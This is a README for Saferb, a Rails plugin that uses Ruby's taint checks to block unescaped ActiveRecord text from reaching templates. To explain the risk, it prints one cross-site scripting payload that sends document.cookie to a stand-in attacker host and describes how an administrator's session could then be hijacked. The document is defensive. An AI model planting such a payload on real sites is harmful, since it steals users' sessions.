Saferb
======

(pronounced "safer" with a "b" on the end)

This is a Rails plugin that makes clever use of Ruby's built-in
String taint checks to prevent text attributes coming from ActiveRecord
records from being inserted into the HTML stream unescaped.

Why Bother?
-----------

Cross-Site Scripting attacks are a real threat to application and user
security/privacy. It only takes one single moment of forgetfulness to leave
that little "h" off the front of an rhtml template insertion. Take the
following example:

<%= comment.body %>

Any user adding a comment to a blog, for instance, could insert something
like this into their comment:

<script>document.write('<img src="http://myevilserver.com?grab_session_id=' + escape(document.cookie) + '"/>')</script>

Once the record saves, anyone who visits the page where the unescaped comment
body is displayed will have their session id sent to the hacker's server.
This is especially scary if you consider that a site administrator could view
the page and get thier session hijacked. The hacker could sign in using their
session and change the administrator password. Yikes!

How It Works
------------

For each text attribute you wish to taint (protect), use the class
method "attr_tainter" with a list of attribute names. All this does is
wrap read_attribute for the given attribute and mark its value as
tainted.

Example of using attr_tainter:

  class Comment < ActiveRecord::Base
    belongs_to :post
    attr_tainter :body, :name, :email, :website
  end
  
The modified ERB class does the rest. If you insert the value of a
protected text attribute directly into an rhtml template (without
escaping it) an exception will be raised for that template. To
avoid the error, escape the text with h(...) or <%=h ... %>.

If you *know* your text is safe to insert into the template unescaped,
you may call s(...) or <%=s ... %>. The idea is to *not* get in the habit
of doing this, as that will defeat the purpose of using this plugin
in the first place.

Notes
-----

This is still a work in progress. It is not full-proof. It will not magically
make your application secure. But it's a good tool to help you remember to
be safe in your development.

If you don't like the fact that it hijacks the built-in Ruby
taint checking for a slightly different purpose, then please
understand you don't have to use this plugin. I'm not pining
for its inclusing in Rails core or anything; it's simply a
good tool for keeping developers out of trouble.